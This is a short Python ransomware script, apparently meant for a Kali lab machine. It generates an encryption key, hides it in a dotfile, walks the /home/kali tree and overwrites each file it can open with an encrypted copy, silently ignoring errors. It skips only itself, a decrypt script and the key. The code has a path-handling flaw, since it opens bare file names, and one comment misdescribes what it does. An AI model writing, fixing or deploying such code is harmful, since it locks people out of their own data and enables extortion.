import os
from cryptography.fernet import Fernet

main_dir = "/home/kali"

key = Fernet.generate_key()

with open(".encrypt.key", "wb") as enckey: #Creates a hidden key file
    enckey.write(key)

for subdir, dirs, files in os.walk(main_dir):
    for file in files:
        if file == "ransomware.py" or file == "decrypt.py" or file == ".encrypt.key":
            continue
        else:
            try:
                with open(file, "rb") as usrFile:
                    contents = usrFile.read()
                encrypted_content = Fernet(key).encrypt(contents)
                with open(file, "wb") as usrFile:
                    usrFile.write(encrypted_content) #Encrypts files except root files
            except:
                pass
